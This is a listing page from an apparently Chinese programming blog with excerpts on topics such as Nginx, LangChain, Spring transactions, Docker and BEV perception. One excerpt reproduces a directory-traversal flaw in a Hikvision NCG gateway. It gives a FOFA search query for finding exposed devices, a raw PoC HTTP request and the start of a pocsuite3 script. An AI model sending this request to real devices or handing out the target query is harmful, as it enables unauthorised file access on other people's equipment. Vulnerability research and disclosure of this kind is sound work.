优化目标函数： 优化目标是最小化电网购电成本，其中电价通过对偶变量（dual variable）表示。
2. 代码主要步骤
基本参数和数据初始化： 设置了电力系统的基本参数，包括优化时刻、基准功率、基准电压等，并提供了电力网络的线路数据。
负荷和风机出力的设置： 从线路数据中提取了负荷数据，并设置了风机出力相关的参数。
优化问题的变量定义： 定义了优化问题的决策变量，包括线路功率、节点电压等。
电力网络约束的建立： 初始化了一些约束的容器，并将不同类型的约束添加到这些容器中，包括潮流方程、二阶锥约束等。
优化目标函数的设定： 设置了目标函数为电网购电成本，用于优化问题求解。
电力网络潮流方程的建立： 建立了潮流方程的约束，确保电流和功率之间满足电力系统的物理规律。
二阶锥约束的建立： 通过二阶锥约束，确保电流和电压之间满足特定的数学关系。
优化问题的求解： 使用YALMIP工具箱调用Gurobi求解器，求解了电力系统的优化问题，目标是最小化电网购电成本。
结果输出和分析： 根据求解结果，判断是否成功，输出最优解的电网购电成本，并通过对偶变量分析电价的三维图像。
3. 结果分析
通过对电价的三维图像分析，可以深入了解电力系统各时刻的电价情况。在优化结果成功的情况下，用户可以获得最优的购电成本，并根据电价分布制定电力系统运营策略。
4. 性能分析
通过tic和toc函数计算整个代码段的运行时间，有助于评估算法和优化求解器的性能。这对于处理大规模电力系统和实时决策有重要意义。
总结
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/938b8763a86a7557384e895a5da33578/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a9ced41f71012b17edbc83917a8c1f6/" rel="bookmark">
			配置Nginx解决跨域问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Nginx 中将前端请求中的所有以 “/apiUrl” 开头的路径代理到 http://192.12.200.101:9813
例如：
/apiUrl/login ===&gt; http://192.12.200.101:9813/login
配置nginx环境
进入Nginx 的配置文件编辑界面: sudo nano /etc/nginx/conf.d/default.conf 开始编辑 default.conf server { listen 80; server_name localhost; # 这里配置，配置如下 location /apiUrl/ { rewrite ^/apiUrl(/.*)$ $1 break; # 路径重写 proxy_pass http://192.12.200.101:9813; # 代理请求转发的目标地址 add_header Access-Control-Allow-Origin *; # 表示允许任何域的请求访问资源。 add_header Access-Control-Allow-Methods *;# 定义允许跨域请求的 HTTP 方法 proxy_set_header Content-Type "application/x-www-form-urlencoded; charset=UTF-8"; # 设置代理请求时的 HTTP 请求头部信息。 } #charset koi8-r; access_log /var/log/nginx/host.access.log main; error_log /var/log/nginx/error.log error; location / { root /usr/share/nginx/html; index index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a9ced41f71012b17edbc83917a8c1f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05f6c67babb1736d992362298ffbbe5a/" rel="bookmark">
			LangChain简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LangChain是什么 LangChain是基于大语言模型，提供很多工具组件，来构建语言模型应用的开发框架。我们可以用来开发聊天机器人、生成式问题回答（GQA）、摘要等应用。
框架的核心思想是，基于大语言模型，将不同的组件链接在一起，创建高级的应用。组件链由来自不同模块的组件构成，通常有下列的组件：
Prompt模板：提示模板是不同类型提示的模板。例如“聊天机器人”风格的模板，问答等。LLMs：像GPT-3，BLOOM等大型语言模型。Agents：代理使用LLMs来决定应该采取哪些操作。可以使用像网页搜索或计算器等工具，所有的工具都被打包成一个操作的逻辑循环。Memory：短期记忆，长期记忆。 Prompt模版组件 输入到LLMs的Prompt通常会以不同的方式结构化，以便我们能够获得不同的结果。对于问答，我们可以将用户的问题重新格式化，以适应不同的问答风格，例如传统的问答形式、答案的项目列表，甚至是与给定问题相关的问题摘要。
使用LangChain创建Prompts 首先安装 langchain库
pip install langchain 导入PromptTemplate模块，然后创建模版
from langchain import PromptTemplate template = """Question: {question} Answer: """ prompt = PromptTemplate( template=template, input_variables=['question'] ) # user question question = "Which NFL team won the Super Bowl in the 2010 season?" 最终基于模版和问题创建得到的Prompt如下：
Question: Which NFL team won the Super Bowl in the 2010 season? Answer: Hugging Face Hub LLM huggging face类似github，上面提供了大量的免费预训练模型，LangChain也提供了对应的组件，可以访问huggging face上模型接口来进行问答。
在LangChain中，提供了Hugging Face模型访问组件，首先我们需要一个Hugging Face账户和API密钥[1]。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05f6c67babb1736d992362298ffbbe5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91b7e1e89458d0c77b8bc0aa6186944c/" rel="bookmark">
			事务的传播行为
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 事务的传播行为 事务的传播行为，可以通俗地理解为在软件程序中，当你在执行一个需要多个步骤的任务时，这些步骤是如何关联到一个整体的事务（一个保证数据完整性和一致性的操作单元）中的规则。这在数据库操作中尤为重要。让我通过一个简单的比喻来解释：
想象一下，你正在做一道复杂的菜肴，这道菜需要多个步骤：切菜、炒菜、调味等。每个步骤就像程序中的一个操作。
REQUIRED（必需）：
如果你已经开始做这道菜（已经有一个事务在进行中），那么新的步骤（比如调味）就加入到这个正在做的菜里。如果你还没开始做菜（没有事务），那么你就开始一个新的菜（新事务）。 REQUIRES_NEW（需要新的）：
不管你是否正在做这道菜，你都会重新开始一个新的菜（开始一个全新的事务）。就好比你暂停当前的烹饪，开一个新锅做另一道菜。 SUPPORTS（支持）：
如果你已经在做这道菜，那么新的步骤就加入进来。但如果你还没开始，那么你就不做这道菜（不在事务中进行操作）。 MANDATORY（强制性）：
这个步骤只能在你已经开始做菜的时候进行。如果你还没开始做菜，就不能执行这个步骤（如果没有事务就会报错）。 NEVER（从不）：
这个步骤只能在你没有开始做菜的时候进行。如果你已经在做菜了，就不能执行这个步骤（如果已经在事务中就会报错）。 NOT_SUPPORTED（不支持）：
这个步骤总是单独进行，与你是否正在做菜无关。即使你正在做菜，这个步骤也要单独完成。 NESTED（嵌套）：
如果你正在做这道菜，这个步骤就像是在这个过程中添加一个子任务。如果子任务失败了，只有这个部分会被撤销，而整个菜不会受影响。如果你还没开始做菜，它就像是开始一个新的菜。 通过选择合适的传播行为，你可以确保你的烹饪（或程序中的数据操作）既高效又符合逻辑。这在处理需要多个步骤协作完成的复杂任务时非常重要。
解释和用途 REQUIRED：适用于大多数情况，确保方法在事务环境中运行。SUPPORTS：用于可选事务场景，即方法可以在事务中也可以不在事务中运行。MANDATORY：适用于必须在事务中执行的操作，确保调用者已经开启了事务。REQUIRES_NEW：适用于需要独立于当前事务运行的场景，例如，需要保证操作不被当前事务影响。NOT_SUPPORTED：用于不应该运行在事务环境中的操作，例如，可能会耗时较长的读操作。NEVER：确保方法不在事务环境中运行，如果存在事务环境则会抛出异常。NESTED：适用于需要执行独立事务但又是当前事务的一部分的场景。嵌套事务允许单独的提交或回滚。 选择正确的事务传播行为对于确保应用程序的正确性和效率至关重要。这通常取决于业务逻辑的具体需求和上下文。
2. 举例说明 1. REQUIRED（默认） 假设有两个服务类，OrderService 和 PaymentService。OrderService 有一个方法 createOrder，而 PaymentService 有一个方法 processPayment。
@Service public class OrderService { @Autowired private PaymentService paymentService; @Transactional(propagation = Propagation.REQUIRED) public void createOrder(Order order) { // 逻辑创建订单 // ... paymentService.processPayment(order.getPayment()); } } @Service public class PaymentService { @Transactional(propagation = Propagation.REQUIRED) public void processPayment(Payment payment) { // 逻辑处理支付 // .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91b7e1e89458d0c77b8bc0aa6186944c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02b31dae48f71dde9df0a10fc44eed93/" rel="bookmark">
			四. 基于环视Camera的BEV感知算法-BEVDet4D
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言0. 简述1. 算法动机&amp;开创性思路2. 主体结构3. 损失函数4. 性能对比总结下载链接参考 前言 自动驾驶之心推出的《国内首个BVE感知全栈系列学习教程》，链接。记录下个人学习笔记，仅供自己参考
本次课程我们来学习下课程第四章——基于环视Camera的BEV感知算法，一起去学习下 BEVDet4D 感知算法
课程大纲可以看下面的思维导图
0. 简述 本节内容我们和大家一起学习一下另外一篇 BEV 感知算法叫 BEVDet4D，我们在 4.6 节中已经和大家一起学习过 BEVDet，从标题上看 BEVDet4D 是 BEVDet 的延续。那 BEVDet4D 有什么额外信息的增加呢，它额外用了什么信息呢，也就是这里的 4D，那我们说 4D 是什么呢，其实就是四维信息，那么除了空间中的三维以外还增加了什么维度呢，时序维度，那也就是题目中提到的 Temporal cues，时序线索
我们还是从以下四个方面展开，算法动机&amp;开创性思路、主体结构、损失函数以及性能对比
1. 算法动机&amp;开创性思路 我们在讨论 BEVDet4D 的算法动机之前我们还是一起先复习下 BEVDet，BEVDet 的框图如下所示：
那 BEVDet 的输入是一个 Multi-view Images 是一个多视角的图像，那对于 nuScenes 数据集而言，视角个数是 6，输出是 3D 检测结果
那 BEVDet 主要由四个模块组成，一个图像编码器 Image-view Encoder 用来处理多视角图像，通过 Encoder 可以得到多视角图像特征，图像 Encoder 是怎么做呢，由 Backbone 网络和多尺度特征融合网络构成。那 View Transformer 又是什么呢，是从 2D 到 3D 的转换器，图像特征从 2D 映射到 3D 再映射到 BEV 空间我们就可以得到所谓的 Camera BEV Features，而 BEV Encoder 是用来对我们前面提取到的 BEV 特征做进一步的编码，所以它的结构与前面的图像编码器是很相似的，也是由 Backbone 网络和 Neck 网络组成。它们的区别在哪呢，在输入不一样，BEV Encoder 的输入是 BEV Feature，Image-view Encoder 的输入是我们的输入图像，通过 BEV Encoder 之后可以得到用于特定任务的特征，那比如说我们要做 3D 检测任务，我们就是得到了利用 3D 检测 Head 完成 3D 目标检测任务
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02b31dae48f71dde9df0a10fc44eed93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/426d94f28ab8bbc1de7b03f41fd316e4/" rel="bookmark">
			四. 基于环视Camera的BEV感知算法-BEVDet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言0. 简述1. 算法动机&amp;开创性思路2. 主体结构3. 损失函数4. 性能对比总结下载链接参考 前言 自动驾驶之心推出的《国内首个BVE感知全栈系列学习教程》，链接。记录下个人学习笔记，仅供自己参考
本次课程我们来学习下课程第四章——基于环视Camera的BEV感知算法，一起去学习下 BEVDet 感知算法
课程大纲可以看下面的思维导图
0. 简述 本次课程我们和大家一起学习一下一篇非常经典的环视算法 BEVDet，其实从题目中也能看出来像 BEVDet 算法是 High-Performance 一个高性能的 BEV 算法，它这个性能是包含两方面的，一方面准确度是很好的，另一方面它的速度也是比较快的，偏工程应用性质的一篇文章，我们一起来学习一下
首先还是从四个方面展开，算法动机&amp;开创性思路、主体结构、损失函数和性能对比
1. 算法动机&amp;开创性思路 它的开创性思路是什么呢，我们在介绍 BEVDet 的动机前，我们先看一下题目是什么意思，BEVDet 的全文名字叫 BEVDET: High-Performance Multi-Camera 3D Object Detection in Bird-Eye-View，那什么意思呢，High-Performance 是一个性能很高的一种检测器，那性能我们刚刚也讲过包含两个方面，一方面是它的精度很高，另一方面是速度很快；那 Multi-Camera 我们很熟悉了环视的意思，环视表示的是多视角的图像，所以我们知道 BEVDet 这篇工作是在基于多视角的图像来做 3D 处理的；另一个关键词是 Bird-Eye-View 也就是我们说的上帝视角俯视图，那我们结合这两个词可以猜到 BEVDet 怎么做呢，利用的是多视角的图片统一到 BEV 的视角后去进行 3D 检测任务
刚提到的这个是目前自动驾驶领域比较火的一个研究方向，我们主要是基于采集到的环视图像信息构建 BEV 视角特征从而完成自动驾驶感知的相关任务。从相机视角能够转换到 BEV 视角是非常重要的一个事情，那目前主流的方法是分为两种，一种叫显式估计的图像深度完成 BEV 多视角的构建，那也被称为从下而上的构建方式；另一种是利用 Transformer 的 Query 查询机制可以利用 BEV Query 来构建 BEV 特征，也叫自上而下的构建方式
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/426d94f28ab8bbc1de7b03f41fd316e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0198b247ea4a872b53602ea5a79110f2/" rel="bookmark">
			Python tkinter一些十分灵活的运用方式和实用函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.隐藏窗口最大化和最小化按钮
2.隐藏整个标题栏
3.实现组件透明背景和透明字体
4.发出系统提示音
5.等待输出（wait_window()等方法）
6.灵活使用窗口update方法替换mainloop避免多线程或窗口after方法的使用
7.禁用窗口
8.使组件处于busy状态
9.调用字体选择对话框
10.窗口主题
tkinter完整教程：Python tkinter(GUI编程)模块最完整教程（上）-CSDN博客
1.隐藏窗口最大化和最小化按钮 ##Example1 from tkinter import * parent = Tk() parent.title("parent") toplevel = Toplevel(parent) toplevel.title("toplevel") toplevel.transient(parent)#实现messagebox式的窗口 mainloop() ​#这里需要注意的是，当父窗口隐藏后，经过transient简化的窗口也会跟随父窗口隐藏。 ##Example2 from tkinter import * root = Tk() root.title("Tk") toplevel = Toplevel(root) toplevel.title("Toplevel") root.attributes("-toolwindow", True) toplevel.attributes("-toolwindow", True)#实现menu点击虚线（tearoff）后的窗口效果 mainloop() 2.隐藏整个标题栏 from tkinter import * parent = Tk() Toplevel(parent).overrideredirect(True)#实现隐藏了整个标题栏的窗口 mainloop() 3.实现组件透明背景和透明字体 如果你要让整个窗口里的全部组件包括窗口都实现透明（可调节透明度），你可以使用Tk/Toplevel.attributes("-alpha",alphanum)参见：https://www.pynote.net/archives/1234
如果你要设置组件透明背景，实现字体透明，你可以使用Tk()/Toplevel().attributes("-transparentcolor",colorname)
需要注意的是，在Windows7中，透明的内容是无法被鼠标点击穿透的，用户不能点击透明区域的其他应用程序。但是在Windows10中，用户是可以的。而在其他系统中，可能无法执行transparentcolor。
from tkinter import * root = Tk() root.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0198b247ea4a872b53602ea5a79110f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae7738d2745801a83231df7f7823250a/" rel="bookmark">
			【C&#43;&#43;】基于iomanip标准库的流对象格式化输出详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一.iomanip标准库是什么？（What is it） 1.从名字上看：iomanip是 io-manipulator的简称，意思是输入输出操控器
2.从对象上看：io针对的是流对象的输入输出，包括常见的：
- 标准输入输出流&lt;iostream&gt;：cin，cout
- 文件输入输出流：ofstream，ifstream，fstream
- 字符串输入输出流&lt;sstream&gt;：istringstream，ostringstream，iostringstream
3.从功能上看：iomanip是对流对象进行格式化操作，包括但不限于控制左右对齐，控制输入输出精度，控制输出宽度，指数表示等，和C语言print格式化输出有异曲同工之处。
二.iomanip什么情况下使用？（When and Where） 简单一句话来说：常用于输出特定格式的内容或数据。
比如，为了使得控制台输出结果更便于查看对比，或者要按照特定格式输出文本文件等等
三.iomanip中这些功能如何使用？(How to use) 下面是我们常用的格式化输出功能：
常用iomanip标准库功能函数 setbase(n) 设置整数为n进制(n=8,10,16) setfill(n) 设置字符填充，c可以是字符常或字符变量
setprecision(n) 设置浮点数的有效数字为n位 setw(n) 设置字段宽度为n位 setiosflags(ios::fixed) 设置浮点数以固定的小数位数显示 setiosflags(ios::scientific) 设置浮点数以科学计数法表示 setiosflags(ios::left) 输出左对齐 setiosflags(ios::right) 输出右对齐 setiosflags(ios::skipws) 忽略前导空格 setiosflags(ios::uppercase) 在以科学计数法输出E与十六进制输出X以大写输出，否则小写。 setiosflags(ios::showpos) 输出正数时显示"+"号 setiosflags(ios::showpoint) 强制显示小数点 resetiosflags() 终止已经设置的输出格式状态，在括号中应指定内容
dec 设置整数为十进制 hex 设置整数为十六进制 oct 设置整数为八进制 接下来对常用的函数给出详细使用方法和使用示例
1. 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6edf720c47d1eb47527f093d8356f7b1/" rel="bookmark">
			【shell脚本实战案例】shell中特殊变量及其含义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		shell中特殊变量及其含义: $0:当前脚本的文件名
$n:传递给脚本或者函数的参数
$#:传递给脚本或者函数的参数个数
$*:传递给脚本或者函数的所有参数
$@:传递给脚本或者函数的所有参数，当被双引号""包含时同上有所区别
$?:上个命令的退出状态，或函数的返回值，0为正确，其余为错误，可以自定义
$$:当前shell进程的ID
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e04ecfd01454493fbaac396e98b82e0/" rel="bookmark">
			【shell脚本实战案例】awk实现行转列数据变换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题背景： awk（“Aho, Weinberger, and-Kernighan”）
是一种文本处理工具，用于从输入文件中提取并输出指定的信息。它以行为单位读取文件，并根据用户定义的模式和操作来处理每一行数据。
awk命令是一种强大的编程语言，结合了模式匹配、文本处理和数据分析的功能。
当数据需要进行行转列的时候，我们可以使用awk实现，具体方法如下：
解决方法： 行转列：
#行转列 awk -F" " '{for(i=1;i&lt;=NF;i++) print $i}' 其中NF指的是列的总数
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8227b915a3e30f5213c19ebed0e67d2c/" rel="bookmark">
			数据结构与算法 | 第五章：二叉树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文参考网课为 数据结构与算法 1 第五章二叉树，主讲人 张铭 、王腾蛟 、赵海燕 、宋国杰 、邹磊 、黄群。
本文使用IDE为 Clion，开发环境 C++14。
更新：2023 / 12 / 17
数据结构与算法 | 第五章：二叉树 树概念术语递归定义分类二叉树基本形态分类满二叉树（ Full Binary Tree ）完全二叉树（ Complete Binary Tree ）扩充二叉树（ Extended Binary Tree ） 二叉树性质结点数目与层次关系不同类型结点间关系结点数目与深度/高度关系 二叉树抽象数据类型二叉树结点抽象数据类型二叉树抽象数据类型 二叉树遍历深度优先遍历应用表达式二叉树 算法递归算法非递归算法前序遍历示例中序遍历示例后序遍历示例 时间、空间代价分析 广度优先遍历时间、空间代价分析 二叉树存储顺序存储链式存储寻找父节点以递归框架寻找以非递归框架寻找 空间代价分析 应用二叉搜索树概念操作检索示例时间、空间代价分析 插入示例时间、空间代价分析 删除示例时间、空间代价分析 堆与优先队列概念定义建堆筛选法理论代码实现时间代价分析 堆的相关操作插入理论代码实现时间代价分析 删除理论代码实现时间代价分析 堆的应用 Huffman树及其应用编码Huffman编码定义 Huffman解码 应用正确性证明引理定理 编码效率 参考链接 先回顾一下线性结构与非线性结构的主要区别：
线性结构
线性结构中的元素满足线性关系，每个内部元素有且仅有一个前驱结点、一个后继结点。非线性结构
至少存在一个数据元素，具有两个或两个以上的前驱或者后继。
根据前驱结点数目是否有限制，非线性结构可以进而分为树结构和图结构。 树结构
前驱唯一，后继不限 包含 n (n&gt;=0) 个结点的有穷集合E，E上定义了一个满足以下条件关系r：
有且仅有一个称为树根（root）的结点er ∈ E，在关系r下没有前驱；除结点 er 外，E中所有结点对于关系r来说都有且仅有一个前驱；除结点 er 外，对任何结点 e ∈ E，都存在一个结点序列 er，e1，…，es，使得er 就是树根，且 es = e，有序对&lt;ei-1，ei&gt; ∈ r (1 &lt;= i &lt;= s)；该结点序列称为从根到结点e的一条路径（path） 图结构
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8227b915a3e30f5213c19ebed0e67d2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa72afb10a6aa3caeee1db2309b42cf4/" rel="bookmark">
			报错解决：RuntimeError: Error compiling objects for extension和nvcc fatal: Unsupported gpu architecture
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错解决：RuntimeError: Error compiling objects for extension和nvcc fatal: Unsupported gpu architecture 报错原因与解决GPU硬件架构不支持，查询你的GPU型号和架构，使用合适的硬件安装的Pytorch和CUDA版本不匹配，解决办法是安装相匹配的CUDA或Pytorch 总结参考文献 报错 博主的软硬件环境（供参考）：
LinuxNVIDIA GeForce RTX 3090CUDA Driver version 515.76CUDA 10.2gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0Pytorch 1.10.0+cu102 博主在配置mmdetection3d环境时，运行pip install -v -e .会有如下报错：
nvcc fatal : Unsupported gpu architecture 'compute_86' error: command '/usr/bin/nvcc' failed with exit code 1 ninja: build stopped: subcommand failed. Traceback (most recent call last): File "/home/user/anaconda3/envs/open_mmlab/lib/python3.8/site-packages/torch/utils/cpp_extension.py", line 1717, in _run_ninja_build subprocess.run( File "/home/user/anaconda3/envs/open_mmlab/lib/python3.8/subprocess.py", line 516, in run raise CalledProcessError(retcode, process.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa72afb10a6aa3caeee1db2309b42cf4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7064668bbd27a054238d30b6f86e197/" rel="bookmark">
			DevEco Studio 项目鸿蒙（HarmonyOS）多语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DevEco Studio 项目鸿蒙（HarmonyOS）多语言
一、操作环境
操作系统: Windows 10 专业版
IDE:DevEco Studio 3.1
SDK:HarmonyOS 3.1
二、多语言
新版本IDE可以创建多语言的文件夹，在entry-&gt;src-&gt;main-&gt;resources下，修改en_US和zh_CN文件夹下element的string.json文件即可。
下图是文件示意。
调用方法和资源调用是一样的。
看下运行结果（中文）：
下图是英文的：
好了就写到这吧！
你有时间常去我家看看我在这里谢谢你啦...
我家地址:亚丁号
最后送大家一首诗:
山高路远坑深,
大军纵横驰奔,
谁敢横刀立马？
惟有点赞加关注大军。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/291e90c1ed3ab026796d2949d077bb9f/" rel="bookmark">
			DevOps常用工具全家桶，实现高效运维和交付
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		专栏集锦，大佬们可以收藏以备不时之需：
Spring Cloud 专栏：http://t.csdnimg.cn/WDmJ9
Python 专栏：http://t.csdnimg.cn/hMwPR
Redis 专栏：http://t.csdnimg.cn/Qq0Xc
TensorFlow 专栏：http://t.csdnimg.cn/SOien
Logback 专栏：http://t.csdnimg.cn/UejSC
量子计算：
量子计算 | 解密著名量子算法Shor算法和Grover算法
AI机器学习实战：
AI机器学习实战 | 使用 Python 和 scikit-learn 库进行情感分析
AI机器学习 | 基于librosa库和使用scikit-learn库中的分类器进行语音识别
Python实战：
Python实战 | 使用 Python 和 TensorFlow 构建卷积神经网络（CNN）进行人脸识别
Spring Cloud实战：
Spring Cloud实战 |分布式系统的流量控制、熔断降级组件Sentinel如何使用
Spring Cloud 实战 | 解密Feign底层原理，包含实战源码
Spring Cloud 实战 | 解密负载均衡Ribbon底层原理，包含实战源码
1024程序员节特辑文章：
1024程序员狂欢节特辑 | ELK+ 协同过滤算法构建个性化推荐引擎，智能实现“千人千面”
1024程序员节特辑 | 解密Spring Cloud Hystrix熔断提高系统的可用性和容错能力
1024程序员节特辑 | ELK+ 用户画像构建个性化推荐引擎，智能实现“千人千面”
1024程序员节特辑 | OKR VS KPI谁更合适？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/291e90c1ed3ab026796d2949d077bb9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76684821ca9ed0ad5cec2387be367010/" rel="bookmark">
			EFCore基础之如何执行原生SQL语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阅读本文你的收获： 学习EF Core中自带的执行原生SQL语句的方法了解EF Core中自带的方法有什么限制？为EF Core编写一个扩展方法，使其突破限制，执行任何SQL语句 Entity Framework (EF) Core 是轻量化、可扩展、开源和跨平台版的常用 数据访问技术。EF Core 是一个对象关系映射程序 (O/RM)框架，这可以实现以下两点：
使 .NET 开发人员能够使用 C#的对象来处理数据库。无需再像通常那样编写大部分数据访问代码。 一. 场景描述 使用EF core去操作数据库的时候，基本的增删改查、甚至两表联查等都是不需要去写SQL语句的，一来节约我们大量拼接SQL语句的时间，二来它可以根据使用数据库的不同，自动生成对应的SQL语句。本来O/RM的目的就是为了提高我们的开发效率。
但是在做一些报表功能时，需要写一个复杂的多表联查、分组查询，EF Core给我们自动生成的SQL语句，在执行时难免会消耗更多的执行时间。好在EF Core的开发者早就考虑到了这种对性能有极致要求的场景，所以给我们提供了一些方法，让我们直接执行原生的SQL语句。
二. EF Core中执行原生SQL 2.1 如何执行原生SQL查询语句 Entity Framework Core为DbSet&lt;TEntity&gt;提供了扩展方法:
FromSqlRaw方法：执行原生SQL查询语句（select语句），如需传参，可用SqlParameter传参；FromSqlInterpolated方法：如果SQL语句字符串中用$插值来拼接参数，则使用该方法。这个方法能防止SQL注入。 注意： 如果是Like 模糊查询，建议用FromSqlRaw方法，因为FromSqlInterpolated方法会将特殊字符 like ，%等 给过滤掉。
例子：
//引用命名空间 using Microsoft.EntityFrameworkCore; //应用ef core的命名空间 //... OADbContext _db; //OADbContext是EF Core上下文对象,依赖注入该对象（略） /// &lt;summary&gt; /// 根据角色名称，模糊查询角色 /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; public List&lt;Role&gt; GetRolesByName(string roleName) { string strsql = "select * from roles where RoleName like @para1"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76684821ca9ed0ad5cec2387be367010/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/044170b82a40df6b9634b0f1d9a2b1c0/" rel="bookmark">
			漏洞复现-海康威视 NCG 联网网关 login.php 目录遍历漏漏洞（附漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 海康威视NCG联网网关login.php存在目录遍历漏漏洞。
fofa语句 body="data/login.php" &amp;&amp; country="CN" poc加检测 GET /data/login.php::$DATA HTTP/1.1 Host: Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 poc脚本 脚本用的pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2023/12/17 # @Author: 炼金术师诸葛亮 from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD, random_str class haikang_NCG_login_dir(POCBase): pocDesc = '''海康威视 NCG 联网网关 login.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/044170b82a40df6b9634b0f1d9a2b1c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bef3a3df43d4a8de5cdf0d3b092d94de/" rel="bookmark">
			基于CentOS7_安装Docker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 基于CentOS7_安装Docker 配置网络，使其能ping通外网 安装依赖包 yum install -y yum-utils device-mapper-persistent-data lvm2 下载repo文件 wget -O /etc/yum.repos.d/docker-ce.repo https://repo.huaweicloud.com/docker-ce/linux/centos/docker-ce.repo 更换软件仓库地址 sudo sed -i 's+download.docker.com+repo.huaweicloud.com/docker-ce+' /etc/yum.repos.d/docker-ce.repo 更新软件仓库 yum makecache fast 查看Docker软件包版本 yum list docker-ce --showduplicates 安装Docker yum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7 -y 启动Docker服务 systemctl start docker systemctl enable docker 配置命令自动补齐 yum install bash-completion -y source /usr/share/bash-completion/bash_completion 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f370e7cd5fba7ae29ad0196f4751d085/" rel="bookmark">
			Python实现员工管理系统（Django页面版 ) 六
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇博客主要实现用户账号管理，这与之前的账号管理不同，之前的账号管理你可以理解为公司在外面买的一些手机号然后需要发放给员工做内部使用，而本篇博客的用户账号管理主要是为了后续的登录网页实现，那么我们开始今天的项目实现吧。
本次项目效果展示：
用户账号创建步骤：
1. 在models.py里面完成员工列表的数据表建立以及迁移操作
2. 根据需要实现的需求在urls.py配置好每个需求的url地址。
